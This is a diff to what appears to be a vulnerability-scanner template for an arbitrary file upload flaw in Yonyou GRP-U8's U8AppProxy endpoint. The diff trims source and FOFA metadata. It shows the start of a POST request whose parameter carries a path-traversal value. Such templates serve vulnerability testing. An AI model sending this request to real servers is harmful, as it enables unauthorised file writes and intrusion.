@@ -3,14 +3,8 @@ info:
   name: 用友GRP-U8U8AppProxy任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bf7a37d2664f48acce0891e5f1d7056c
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bf7a37d2664f48acce0891e5f1d7056c
-    fofa: + fofa`app="用友-GRP-U8"`
 http:
 - raw:
   - 'POST /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_test HTTP/1.1
